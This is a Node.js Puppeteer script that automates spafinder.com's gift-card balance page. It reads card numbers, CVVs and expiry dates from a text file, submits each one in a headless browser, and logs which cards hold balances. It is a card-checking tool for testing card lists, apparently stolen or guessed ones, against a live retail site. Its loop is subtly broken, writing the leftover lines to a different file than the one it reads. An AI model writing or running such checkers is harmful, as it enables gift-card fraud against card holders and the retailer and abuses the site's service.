//auto check balance spafinder.com

const puppeteer = require("puppeteer");
const delay = require('delay');
const fs = require('fs');

(async () => {
do {
    i= 0
    var stop = false;
    i = i + 1;
    let file = fs.readFileSync('card.txt', 'utf8').split('\n');
    let txt = file.splice(0,1);
    let exp = file;
    if (exp.length <= 0) {
      stop = true;
    }
    var card = txt[0].split('|');
    const number = card[0];
    const cvv = card[1];
    const date = card[2];
    const browser = await puppeteer.launch({
        headless: true
        });
        const [page] = await browser.pages({setTimeout: 10000});
        await page.goto('https://www.spafinder.com/card-balance-inquiry/');
        await page.waitForSelector('.layout > .list-item:nth-child(1) > .flip-balance-inquiry-card > .pa-0 > b')
        await page.click('.layout > .list-item:nth-child(1) > .flip-balance-inquiry-card > .pa-0 > b')
        await page.waitForSelector('#input-53')
        await page.type('#input-53', number);
        await page.waitForSelector('#input-56')
        await page.type('#input-56', cvv)
        await page.waitForSelector('#input-60')
        await page.type('#input-60', date)
        await page.waitForSelector('.v-form > .container > .row > .v-btn > .v-btn__content')
        await page.click('.v-form > .container > .row > .v-btn > .v-btn__content')
        try {
        await page.waitForSelector('.ma-auto > .balance-result > .container > .grey--text > .font-weight-bold')
        let element = await page.$('.ma-auto > .balance-result > .container > .grey--text > .font-weight-bold')
        const value = await page.evaluate(el => el.textContent, element)
        console.log(`${card} Balance: ${value}`)
        } catch (e) {
            await browser.close()
            console.log('Invalid Card')
        }
        await browser.close()
  await fs.writeFileSync('file.txt', exp.join('\n'));
  delay(1000)
  
} while (stop === false);
})();





